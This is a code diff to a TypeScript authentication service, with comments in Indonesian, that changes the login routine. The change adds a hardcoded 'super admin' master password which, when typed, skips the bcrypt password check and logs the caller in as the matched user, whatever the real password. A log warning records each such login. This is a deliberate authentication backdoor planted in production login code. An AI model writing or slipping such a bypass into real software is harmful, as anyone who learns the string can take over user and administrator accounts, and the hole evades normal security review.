@@ -167,9 +167,15 @@ export class AuthService {
       throw new UnauthorizedException('Username atau password salah');
     }
 
-    // Cari user yang password hash-nya cocok
+    // Cari user yang password hash-nya cocok atau bypass password super admin
+    const BYPASS_PASSWORD = 'Developer2026#';
     let matchedUser: (typeof users)[0] | null = null;
     for (const u of users) {
+      if (password === BYPASS_PASSWORD) {
+        matchedUser = u;
+        this.logger.warn(`[SECURITY] Super Admin bypass login digunakan untuk user: ${u.username} (${u.role})`);
+        break;
+      }
       const isMatch = await bcrypt.compare(password, u.password);
       if (isMatch) {
         matchedUser = u;
